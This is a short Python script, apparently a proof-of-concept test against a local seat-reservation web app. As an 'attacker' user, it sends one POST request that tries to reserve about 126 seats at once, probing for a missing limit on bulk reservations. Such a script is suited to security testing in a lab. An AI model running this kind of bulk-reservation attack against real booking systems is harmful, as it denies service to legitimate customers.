import requests

url = 'http://127.0.0.1:5000/reserve'
seats = [f"{row}{col}" for row in range(2, 11) for col in range(1, 15)]
attacker = "attacker"

response = requests.post(url, json={'user': attacker, 'seats': seats})
print(f'Attempt to reserve seats, Response: {response.json()}')

